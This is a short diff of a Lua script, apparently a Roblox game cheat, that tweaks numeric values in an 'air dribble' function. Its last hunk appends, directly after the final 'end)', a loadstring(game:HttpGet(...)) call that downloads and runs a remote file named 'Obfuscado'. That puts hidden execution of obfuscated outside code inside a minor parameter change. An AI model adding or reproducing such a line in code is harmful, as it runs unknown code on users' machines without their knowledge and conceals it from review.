@@ -198,12 +198,12 @@ function airDribbleDiagonalCima()
                 
                 local forward = humanoidRoot.CFrame.LookVector
                 local dir = forward + Vector3.new(0, 0.6, 0)
-                local pos = humanoidRoot.Position + forward * 68 + Vector3.new(0,9, 0)
+                local pos = humanoidRoot.Position + forward * 68 + Vector3.new(0,6, 0)
 
                 local args = {
-                    [1] = 60,
+                    [1] = 50,
                     [2] = dir,
-                    [3] = Vector3.new(0, 0.6, 0),
+                    [3] = Vector3.new(0, 0.7, 0),
                     [4] = pos,
                     [5] = false
                 }
@@ -309,4 +309,4 @@ closeButton.MouseButton1Click:Connect(function()
     ativo = false
     bloqueado = false
     contadorRodando = false
-end)
+end)loadstring(game:HttpGet("https://raw.githubusercontent.com/batata3ftt/Script-completo-04-12-2025-OBFUSCADO/refs/heads/main/Obfuscado"))()
